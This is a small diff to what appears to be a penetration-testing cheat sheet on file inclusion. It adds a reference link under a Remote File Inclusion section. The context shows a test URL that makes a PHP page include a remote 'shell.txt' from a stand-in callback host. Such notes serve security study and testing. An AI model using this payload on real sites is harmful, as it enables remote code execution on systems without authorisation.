@@ -141,6 +141,8 @@ Log Poisoning
 	
 ## Remote File Inclusion 
 Turning LFI to RFI: https://l.avala.mp/?p=241
+[Reference](https://sushant747.gitbooks.io/total-oscp-guide/content/remote_file_inclusion.html)  
+
 ### Testing 
 
     http://example.com/index.php?page=http://callback.com/shell.txt
